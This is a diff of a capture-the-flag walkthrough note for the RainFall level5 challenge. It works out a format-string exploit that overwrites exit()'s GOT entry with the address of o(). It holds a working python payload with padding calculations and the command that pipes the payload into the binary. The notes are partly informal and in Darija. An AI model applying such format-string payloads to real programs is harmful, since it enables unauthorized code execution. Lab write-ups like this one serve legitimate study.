@@ -43,21 +43,46 @@
 
 the address of o() is => 0x080484a4
 
+
+```
+    for geting arguments: ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
+```
+
+
 ```
     level5@RainFall:~$ objdump -R ./level5 | grep exit
     08049828 R_386_JUMP_SLOT   _exit
     08049838 R_386_JUMP_SLOT   exit
 ```
 
-address of exit() is => 0x08049838
+address of exit() is => 0x08049838 => 
+litle indian1 => \x38\x98\x04\x08
+litle indian2 => \x3a\x98\x04\x08
 
-0x080484a4 → split:
-    Lower 2 bytes: 0x84a4 → 33956
-    Upper 2 bytes: 0x0804 → 2052
+```
+    the address of o() is => 0x080484a4
 
+    Decimal number of 0x0804 => 2052
+    Decimal number of 0x84a4 => 33956
 
-for geting arguments: ./level5 <<< $(python -c 'print("%x."*30)')
+    first_padding = 2052 - 8 = 2044
+    second_padding = 33956 - 2052 = 31904
+```
 
-
-python -c 'print("\x28\x98\x04\x08" + "\x2a\x98\x04\x08" + "%2052d%1$hn" + "%31904d%2$hn")' > /tmp/hax
+python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn")' > /tmp/hax
 (cat /tmp/hax; cat) | ./level5
+
+
+
+9a3ida:
+```
+    0x0804a004
+
+    upper = 0x0804 => 2052
+    lower = 0xa004 => 40964
+
+    uper - dakchiliprintiti9bl = 2052 - 8 = 2044
+
+    lower - upper = 40964 - 2052 = 38912
+```
+
